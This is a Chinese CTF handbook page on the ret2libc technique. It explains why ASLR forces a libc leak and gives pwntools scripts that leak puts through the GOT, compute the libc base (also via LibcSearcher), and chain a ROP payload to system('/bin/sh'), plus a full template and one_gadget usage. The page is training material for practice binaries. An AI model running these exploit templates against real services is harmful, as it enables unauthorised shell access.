---
title: ret2libc 与 libc 泄露
order: 3
icon: mdi:library-outline
category:
  - CTF
  - 手册
  - Pwn
---

当程序开启了 NX（栈不可执行）且没有 `win()` 函数时，需要通过 ret2libc 技术调用 libc 中的 `system("/bin/sh")`。

## 为什么需要泄露 libc

开启 ASLR 后，libc 每次加载的基址都不同，`system()` 和 `/bin/sh` 的地址也随之变化。

**解决方案**：
1. 利用 GOT 表泄露某个 libc 函数的真实地址
2. 用真实地址减去该函数在 libc 中的偏移，得到 libc 基址
3. 用 libc 基址加上 `system` 和 `/bin/sh` 的偏移，得到它们的真实地址

## 泄露 libc 基址

### 方法：puts 泄露 GOT

```python
from pwn import *

elf = ELF('./vuln')
libc = ELF('./libc.so.6')  # 题目提供的 libc，或用 LibcSearcher

# 第一阶段：泄露 puts 的真实地址
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])   # 把 puts 的 GOT 地址放进 rdi
payload += p64(elf.plt['puts'])   # 调用 puts，打印 puts 的真实地址
payload += p64(elf.symbols['main'])  # 返回 main，准备第二次利用

p.sendline(payload)
p.recvuntil(b'\n')
puts_addr = u64(p.recv(6).ljust(8, b'\x00'))  # 接收 6 字节地址

# 计算 libc 基址
libc_base = puts_addr - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))

print(f"libc base: {hex(libc_base)}")
print(f"system: {hex(system_addr)}")
```

### 不知道 libc 版本时：LibcSearcher

```python
from LibcSearcher import LibcSearcher

# 用泄露的地址查找 libc 版本
libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
bin_sh_addr = libc_base + libc.dump('str_bin_sh')
```

## 第二阶段：getshell

```python
# 第二次溢出，调用 system("/bin/sh")
payload2 = b'A' * offset
payload2 += p64(ret)           # 栈对齐（Ubuntu 18.04+ 需要）
payload2 += p64(pop_rdi)
payload2 += p64(bin_sh_addr)
payload2 += p64(system_addr)

p.sendline(payload2)
p.interactive()
```

## 完整模板

```python
from pwn import *

context.arch = 'amd64'

p = process('./vuln')
elf = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

offset = 72  # 实际调试确定

rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret_gadget = rop.find_gadget(['ret'])[0]

# === 第一阶段：泄露 ===
payload1 = flat(
    b'A' * offset,
    pop_rdi, elf.got['puts'],
    elf.plt['puts'],
    elf.symbols['main']
)
p.sendlineafter(b'Input: ', payload1)

puts_real = u64(p.recvuntil(b'\n', drop=True).ljust(8, b'\x00'))
libc.address = puts_real - libc.symbols['puts']
log.success(f"libc @ {hex(libc.address)}")

# === 第二阶段：getshell ===
payload2 = flat(
    b'A' * offset,
    ret_gadget,
    pop_rdi, next(libc.search(b'/bin/sh')),
    libc.symbols['system']
)
p.sendlineafter(b'Input: ', payload2)
p.interactive()
```

## one_gadget

`one_gadget` 是 libc 中满足特定条件就能直接 getshell 的单条 gadget，比构造完整 ROP 链更简单：

```bash
# 安装
gem install one_gadget

# 查找 libc 中的 one_gadget
one_gadget /lib/x86_64-linux-gnu/libc.so.6
# 输出类似：
# 0x4f2a5 execve("/bin/sh", rsp+0x40, environ)
# constraints: rsp & 0xf == 0
```

```python
one_gadget = libc.address + 0x4f2a5
payload = b'A' * offset + p64(one_gadget)
```

## 练手资源

- CTFHub ret2libc 系列
- 攻防世界 Pwn 中级题
